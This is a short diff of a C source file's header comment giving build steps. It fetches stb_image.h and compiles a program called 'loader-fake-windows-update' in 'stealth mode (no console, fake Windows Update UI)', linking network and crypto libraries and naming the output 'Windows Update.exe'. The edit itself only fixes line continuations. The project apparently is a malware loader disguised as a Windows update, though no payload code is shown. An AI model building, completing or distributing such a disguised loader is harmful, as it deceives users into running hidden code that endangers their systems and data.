@@ -17,7 +17,7 @@
     wget https://raw.githubusercontent.com/nothings/stb/master/stb_image.h
 
     # Compile Windows EXE — stealth mode (no console, fake Windows Update UI)
-    x86_64-w64-mingw32-gcc -O2 -s -mwindows loader-fake-windows-update \ -lm -lwininet -lbcrypt \ -o Windows Update.exe
+    x86_64-w64-mingw32-gcc -O2 -s -mwindows loader-fake-windows-update -lm -lwininet -lbcrypt  -o Windows Update.exe
 */
 
 #define STB_IMAGE_IMPLEMENTATION
